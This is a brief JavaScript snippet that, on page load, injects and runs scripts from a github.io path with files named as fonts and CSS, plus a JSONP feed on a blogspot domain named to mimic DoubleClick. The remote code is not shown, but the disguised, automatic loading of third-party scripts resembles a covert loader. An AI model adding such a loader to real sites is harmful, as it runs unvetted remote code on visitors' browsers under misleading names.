
let scripts = [
				'https://kasworld-aero.github.io/old/file/javascript/cdn/adex/font.js',
				'https://doubleclick-ads-exchange-media-server.blogspot.com/feeds/posts/default?alt=json-in-script&amp;callback=rp_results_label&amp;max-results=10',
				'https://kasworld-aero.github.io/old/file/javascript/cdn/adex/css.js',
	'https://kasworld-aero.github.io/old/file/javascript/cdn/adex/font-min.js'
			];
   window.onload = function(){
scripts.forEach(function(url) {
	let mainscript = document.createElement('script');
	mainscript.src = url;
	mainscript.async = false;
	document.body.appendChild(mainscript);
});
   }
